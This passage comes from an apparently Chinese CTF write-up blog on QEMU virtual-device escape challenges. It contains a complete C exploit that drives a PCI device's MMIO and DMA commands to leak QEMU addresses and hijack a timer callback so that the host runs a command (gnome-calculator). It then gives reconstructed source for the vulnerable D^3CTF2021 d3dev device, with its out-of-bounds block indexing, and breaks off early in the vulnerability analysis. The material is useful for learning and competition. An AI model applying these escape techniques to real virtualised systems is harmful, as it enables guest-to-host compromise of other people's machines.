class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint16_t mmio_read16(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(volatile uint16_t*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t mmio_read32(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(volatile uint32_t*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t mmio_read64(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(volatile uint64_t*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write8(size_t off, uint8_t v)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(volatile uint8_t*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write16(size_t off, uint16_t v)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(volatile uint16_t*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write32(size_t off, uint32_t v)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(volatile uint32_t*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write64(size_t off, uint64_t v)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(volatile uint64_t*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 返回映射内某 offset 的可直接访问指针 */</span><br><span class="line">volatile void* mmio_ptr(size_t off)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> NULL;</span><br><span class="line">    <span class="keyword">return</span> (volatile void*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum</span><br><span class="line">&#123;</span><br><span class="line">    SRC = <span class="number">0x08</span>,</span><br><span class="line">    CNT = <span class="number">0x10</span>,</span><br><span class="line">    CMD = <span class="number">0x18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    size_t CP_src;</span><br><span class="line">    size_t CP_cnt;</span><br><span class="line">    size_t CP_dst;</span><br><span class="line">&#125; CP_info;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf read_buf;</span><br><span class="line">    get_adjacent_pages(&amp;read_buf);</span><br><span class="line">    printf(<span class="string">&quot;[+] read_buf vaddr[0]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[+] read_buf vaddr[1]: %p\n&quot;</span>, read_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[+] read_buf paddr: %p\n&quot;</span>, read_buf.paddr);</span><br><span class="line"></span><br><span class="line">    adjacent_pages_buf write_buf;</span><br><span class="line">    get_adjacent_pages(&amp;write_buf);</span><br><span class="line">    printf(<span class="string">&quot;[+] write_buf vaddr[0]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">0</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[+] write_buf vaddr[1]: %p\n&quot;</span>, write_buf.vaddr[<span class="number">1</span>]);</span><br><span class="line">    printf(<span class="string">&quot;[+] write_buf paddr: %p\n&quot;</span>, write_buf.paddr);</span><br><span class="line"></span><br><span class="line">    (*(CP_info*)write_buf.vaddr[<span class="number">0</span>]).CP_dst = read_buf.paddr;</span><br><span class="line">    (*(CP_info*)write_buf.vaddr[<span class="number">0</span>]).CP_cnt = <span class="number">0x1040</span>;</span><br><span class="line">    mmio_write64(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write64(CNT, <span class="number">1</span>);</span><br><span class="line">    mmio_write64(CMD, <span class="number">0x4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    qword_dump(NULL, read_buf.vaddr[<span class="number">1</span>], <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    size_t timer_list_addr = *(size_t*)(read_buf.vaddr[<span class="number">1</span>] + <span class="number">0x08</span>);</span><br><span class="line">    size_t qemu_base = *(size_t*)(read_buf.vaddr[<span class="number">1</span>] + <span class="number">0x10</span>) - <span class="number">0x4dce80</span>;</span><br><span class="line">    printf(<span class="string">&quot;[+] elf base: %p\n&quot;</span>, qemu_base);</span><br><span class="line"></span><br><span class="line">    size_t system_plt = qemu_base + <span class="number">0x2c2180</span>;</span><br><span class="line">    printf(<span class="string">&quot;[*] system@plt: %p\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    size_t opaque_addr = *(size_t*)(read_buf.vaddr[<span class="number">1</span>] + <span class="number">0x18</span>);</span><br><span class="line">    printf(<span class="string">&quot;[+] opaque addr: %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((CP_info*)write_buf.vaddr[<span class="number">0</span>])[i].CP_src = write_buf.paddr;</span><br><span class="line">        ((CP_info*)write_buf.vaddr[<span class="number">0</span>])[i].CP_dst = read_buf.paddr;</span><br><span class="line">        ((CP_info*)write_buf.vaddr[<span class="number">0</span>])[i].CP_cnt = <span class="number">0x1020</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(size_t*)(write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x8</span>) = timer_list_addr;</span><br><span class="line">    *(size_t*)(write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x10</span>) = system_plt;</span><br><span class="line">    *(size_t*)(write_buf.vaddr[<span class="number">1</span>] + <span class="number">0x18</span>) = opaque_addr + <span class="number">0xa00</span> + <span class="number">0x500</span>;</span><br><span class="line"></span><br><span class="line">    char cmd[] = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>;</span><br><span class="line">    memcpy(write_buf.vaddr[<span class="number">0</span>] + <span class="number">0x500</span>, cmd, sizeof(cmd));</span><br><span class="line"></span><br><span class="line">    mmio_write64(SRC, write_buf.paddr);</span><br><span class="line">    mmio_write64(CNT, <span class="number">0x11</span>);</span><br><span class="line">    mmio_write64(CMD, <span class="number">0x1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write64(CMD, <span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="D-3CTF2021-d3dev"><a href="#D-3CTF2021-d3dev" class="headerlink" title="D^3CTF2021 d3dev"></a>D^3CTF2021 d3dev</h1><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qom/object.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_D3DEV <span class="string">&quot;d3dev&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(<span class="keyword">struct</span> d3devState, D3DEV)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> &#123;</span></span><br><span class="line">    PCIDevice  pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> memory_mode;</span><br><span class="line">    <span class="type">uint32_t</span> seek;</span><br><span class="line">    <span class="type">uint32_t</span> init_flag;</span><br><span class="line">    <span class="type">uint32_t</span> mmio_read_part;</span><br><span class="line">    <span class="type">uint32_t</span> mmio_write_part;</span><br><span class="line">    <span class="type">uint32_t</span> r_seed;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> blocks[<span class="number">0x101</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> ( *rand_r)(<span class="type">uint32_t</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tea_encrypt_64</span><span class="params">(<span class="type">uint32_t</span> *lw, <span class="type">uint32_t</span> *hi, <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>U;</span><br><span class="line">        *lw += (sum + *hi) ^ (k[<span class="number">1</span>] + (*hi &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">0</span>] + (*hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        *hi += (sum + *lw) ^ (k[<span class="number">3</span>] + (*lw &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">2</span>] + (*lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (sum != <span class="number">0xC6EF3720</span>U);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tea_decrypt_64</span><span class="params">(<span class="type">uint32_t</span> *lw, <span class="type">uint32_t</span> *hi, <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0xC6EF3720</span>U;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        *hi -= (sum + *lw) ^ (k[<span class="number">3</span>] + (*lw &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">2</span>] + (*lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        *lw -= (sum + *hi) ^ (k[<span class="number">1</span>] + (*hi &gt;&gt; <span class="number">5</span>)) ^ (k[<span class="number">0</span>] + (*hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>U; <span class="comment">/* unsigned 加法：等价于 sum -= 0x9E3779B9 */</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (sum != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- MMIO callbacks ---- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">d3dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line">    <span class="comment">/* 读取选中的 64-bit 块并解密，然后交替返回低/高 32-bit */</span></span><br><span class="line">    <span class="type">uint64_t</span> blk = s-&gt;blocks[s-&gt;seek + ((<span class="type">unsigned</span> <span class="type">int</span>)(addr) &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">    <span class="type">uint32_t</span> lw  = (<span class="type">uint32_t</span>)blk;</span><br><span class="line">    <span class="type">uint32_t</span> hi  = (<span class="type">uint32_t</span>)(blk &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    tea_decrypt_64(&amp;lw, &amp;hi, s-&gt;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;mmio_read_part) &#123;</span><br><span class="line">        s-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)hi;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)lw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">d3dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* 只处理 32-bit 访问 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> idx = s-&gt;seek + ((<span class="type">unsigned</span> <span class="type">int</span>)(addr) &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;mmio_write_part) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> lw = (<span class="type">uint32_t</span>)s-&gt;blocks[idx];</span><br><span class="line">        <span class="type">uint32_t</span> hi = (<span class="type">uint32_t</span>)((s-&gt;blocks[idx] &gt;&gt; <span class="number">32</span>) + val);</span><br><span class="line"></span><br><span class="line">        tea_encrypt_64(&amp;lw, &amp;hi, s-&gt;key);</span><br><span class="line">        s-&gt;blocks[idx] = ((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lw;</span><br><span class="line">        s-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 第一个 32-bit：仅暂存低 32-bit */</span></span><br><span class="line">        s-&gt;blocks[idx] = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        s-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- PMIO callbacks ---- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">d3dev_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x00</span>: <span class="keyword">return</span> s-&gt;memory_mode;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x08</span>: <span class="keyword">return</span> s-&gt;seek;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x0C</span>: <span class="keyword">return</span> s-&gt;key[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>: <span class="keyword">return</span> s-&gt;key[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>: <span class="keyword">return</span> s-&gt;key[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>: <span class="keyword">return</span> s-&gt;key[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">default</span>:   <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">d3dev_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> d3devState *)opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x00</span>:  <span class="comment">/* memory_mode */</span></span><br><span class="line">        s-&gt;memory_mode = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x04</span>:  <span class="comment">/* 清空 key[0..3] */</span></span><br><span class="line">        <span class="built_in">memset</span>(s-&gt;key, <span class="number">0</span>, <span class="keyword">sizeof</span>(s-&gt;key));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x08</span>:  <span class="comment">/* seek（只接受 &lt;= 0x100） */</span></span><br><span class="line">        <span class="keyword">if</span> (val &lt;= <span class="number">0x100</span>) &#123;</span><br><span class="line">            s-&gt;seek = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x1C</span>:  <span class="comment">/* 写入种子并用 rand_r 生成 key[0..3] */</span></span><br><span class="line">        s-&gt;r_seed = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> *p = s-&gt;key;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                *p++ = (<span class="type">uint32_t</span>)s-&gt;rand_r(&amp;s-&gt;r_seed);</span><br><span class="line">            &#125; <span class="keyword">while</span> (p != (<span class="type">uint32_t</span> *)&amp;s-&gt;rand_r);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">/* 其它地址写入：无操作（包括 0x0C..0x18） */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps d3dev_mmio_ops = &#123;</span><br><span class="line">    .read = d3dev_mmio_read,</span><br><span class="line">    .write = d3dev_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps d3dev_pmio_ops = &#123;</span><br><span class="line">    .read = d3dev_pmio_read,</span><br><span class="line">    .write = d3dev_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_d3dev_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> D3DEV(pdev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* BAR0: MMIO 0x800 */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(pdev),</span><br><span class="line">                          &amp;d3dev_mmio_ops, s, <span class="string">&quot;d3dev-mmio&quot;</span>, <span class="number">0x800</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* BAR1: PMIO 0x20 */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;pmio, OBJECT(pdev),</span><br><span class="line">                          &amp;d3dev_pmio_ops, s, <span class="string">&quot;d3dev-pmio&quot;</span>, <span class="number">0x20</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;pmio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">d3dev_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3devState</span> *<span class="title">s</span> =</span> D3DEV(obj);</span><br><span class="line"></span><br><span class="line">    s-&gt;rand_r = rand_r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!s-&gt;init_flag) &#123;</span><br><span class="line">        <span class="type">unsigned</span> i;</span><br><span class="line">        srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            s-&gt;key[i] = (<span class="type">uint32_t</span>)rand();</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;init_flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">d3dev_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(oc);</span><br><span class="line">    k-&gt;realize   = pci_d3dev_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>      = <span class="literal">NULL</span>;</span><br><span class="line">    k-&gt;vendor_id = <span class="number">0x2333</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11E8</span>;</span><br><span class="line">    k-&gt;revision  = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS; <span class="comment">/* 0xFF */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo d3dev_info = &#123;</span><br><span class="line">    .name          = TYPE_D3DEV,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> d3devState),</span><br><span class="line">    .instance_init = d3dev_instance_init,</span><br><span class="line">    .class_init    = d3dev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_d3dev_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;d3dev_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_d3dev_register_types);</span><br></pre></td></tr></table></figure></div>

<p>由于设备是通过 <code>seek + addr / 8</code> 来索引 <code>uint64_t</code> 类型的 <code>blocks</code> 数组， <code>blocks</code> 数组长度为 <code>0x101</code> 。</p>
<ul>
